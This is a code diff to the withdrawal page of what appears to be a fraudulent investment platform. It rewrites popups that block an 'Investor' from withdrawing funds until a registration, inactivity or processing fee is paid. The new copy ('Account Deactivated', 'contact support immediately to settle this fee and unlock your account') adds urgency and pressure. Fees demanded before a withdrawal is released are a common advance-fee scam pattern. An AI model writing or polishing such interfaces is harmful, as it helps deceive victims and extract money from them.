@@ -456,10 +456,10 @@ export default function Withdraw() {
               <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
             </div>
             <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '4px' }}>
-              {feePopup.type === 'registration' ? 'Action Required' : feePopup.type === 'inactivity' ? 'Account Deactivated' : 'Unable to Process Withdrawal'}
+              {feePopup.type === 'inactivity' ? 'Account Deactivated' : 'Action Required'}
             </div>
             <div style={{ color: '#ef4444', fontSize: '11px', fontWeight: '600', marginBottom: '12px' }}>
-              {feePopup.type === 'inactivity' ? 'Inactivity Fee Required' : `${FEE_LABELS[feePopup.type] || feePopup.label} Not Settled`}
+              {feePopup.type === 'inactivity' ? 'Inactivity Fee Required' : feePopup.type === 'registration' ? 'Withdrawal Not Available' : `${FEE_LABELS[feePopup.type] || feePopup.label} Not Settled`}
             </div>
             <div style={{ color: '#555', fontSize: '11px', marginBottom: '14px', lineHeight: '1.7' }}>
               {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
@@ -471,7 +471,7 @@ export default function Withdraw() {
               </>
             )}
             <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
-              Dear Investor, your withdrawal request is on hold. Please contact support to complete this payment.
+              Dear Investor, you are currently unable to perform this action. Your withdrawal request cannot be processed until the required payment above is completed. Please contact support immediately to settle this fee and unlock your account.
             </div>
             <button type="button" onClick={() => { setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
               style={{ width: '100%', padding: '11px', background: '#6366f1', border: 'none', color: 'white', fontSize: '11px', fontWeight: '600', cursor: 'pointer', marginBottom: '8px' }}>
